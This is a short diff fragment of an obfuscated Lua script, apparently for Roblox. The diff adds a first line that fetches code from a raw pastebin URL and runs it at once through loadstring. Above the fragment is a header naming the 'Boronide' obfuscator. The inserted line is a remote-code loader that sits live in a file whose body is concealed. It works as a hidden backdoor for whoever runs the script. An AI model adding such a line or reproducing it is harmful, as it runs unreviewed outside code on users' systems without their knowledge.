@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/ChWmW16z'))()
+
 --Boronide™ Obfuscation, v0.6.4
 
 local G,R,h=nil,nil,nil([[
